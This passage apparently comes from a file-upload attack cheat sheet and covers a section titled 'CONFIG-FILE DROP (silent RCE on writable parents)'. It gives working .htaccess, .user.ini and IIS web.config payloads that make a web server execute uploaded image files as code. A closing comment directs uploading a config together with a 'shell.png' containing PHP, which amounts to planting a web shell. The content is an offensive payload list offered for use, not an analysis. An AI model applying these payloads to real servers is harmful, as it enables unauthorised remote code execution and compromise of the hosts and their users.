## ── 5. CONFIG-FILE DROP (silent RCE on writable parents) ────────────
# Only works if the uploaded file lands in a path where Apache/NGINX reads
# these configs (e.g. uploads dir on a shared host, docroot misuse).
.htaccess:
  AddType application/x-httpd-php .png
  AddHandler application/x-httpd-php .jpg
  <FilesMatch ".*\.ph.*"> SetHandler php5-script </FilesMatch>
  php_flag engine on
.user.ini:
  auto_prepend_file = shell.png.png
  auto_append_file  = shell.png.png
web.config (IIS):
  <configuration><system.webServer><handlers>
    <add name="x" path="*.png" verb="*" type="System.Web.UI.PageHandlerFactory" />
  </handlers></system.webServer></configuration>
# Upload the config + upload "shell.png" containing PHP -> LFI/prepend executes it.
